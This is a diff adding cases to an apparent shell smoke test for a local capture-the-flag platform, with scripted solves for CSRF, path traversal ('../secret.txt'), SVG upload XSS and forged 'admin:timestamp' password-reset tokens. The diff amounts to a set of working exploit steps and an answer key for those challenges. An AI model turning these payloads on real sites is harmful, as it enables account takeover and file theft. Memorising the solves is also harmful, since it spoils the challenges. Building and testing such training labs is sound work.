@@ -119,5 +119,37 @@ if [ -n "${S:-}" ]; then
   submit abuse-redeem "$S" "$F" | grep -q '"correct":true' && ok "coupon abuse → flag accepted" || bad "ratelimit solve" "$F"
   destroy "$S"
 fi
+
+L=$(launch web-csrf-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "csrf launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  CK=$(curl -s -D- -o /dev/null -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"victim","password":"victim"}' | grep -i "^set-cookie" | sed 's/.*session=\([^;]*\).*/\1/')
+  F=$(curl -s -X POST "http://127.0.0.1:$P/api/transfer" -H "Cookie: session=$CK" -H 'Content-Type: application/json' -d '{"to":"attacker","amount":100}' | J "d.get('flag','')")
+  submit csrf-transfer "$S" "$F" | grep -q '"correct":true' && ok "CSRF transfer → flag accepted" || bad "csrf solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-traversal-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "traversal launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  F=$(curl -s "http://127.0.0.1:$P/files?name=../secret.txt" | J "d.get('flag','')")
+  submit traverse-read "$S" "$F" | grep -q '"correct":true' && ok "traversal → flag accepted" || bad "traversal solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-upload-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "upload launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  SVG=$(python3 -c "import base64;print(base64.b64encode(b'<script>BBM2</script>').decode())")
+  curl -s -X POST "http://127.0.0.1:$P/avatar" -H 'Content-Type: application/json' -d "{\"filename\":\"evil.svg\",\"content_b64\":\"$SVG\"}" > /dev/null
+  F=$(curl -s "http://127.0.0.1:$P/flag?marker=BBM2" | J "d.get('flag','')")
+  submit upload-xss "$S" "$F" | grep -q '"correct":true' && ok "upload XSS → flag accepted" || bad "upload solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-crypto-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "crypto launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  FORGED=$(python3 -c "import base64,time;print(base64.urlsafe_b64encode(f'admin:{int(time.time())}'.encode()).decode())")
+  F=$(curl -s -X POST "http://127.0.0.1:$P/reset/confirm" -H 'Content-Type: application/json' -d "{\"token\":\"$FORGED\",\"new_password\":\"pwned\"}" | J "d.get('flag','')")
+  submit forge-reset "$S" "$F" | grep -q '"correct":true' && ok "reset forge → flag accepted" || bad "crypto solve" "$F"
+  destroy "$S"
+fi
 echo "== $PASS passed, $FAIL failed =="
 [ "$FAIL" = "0" ]
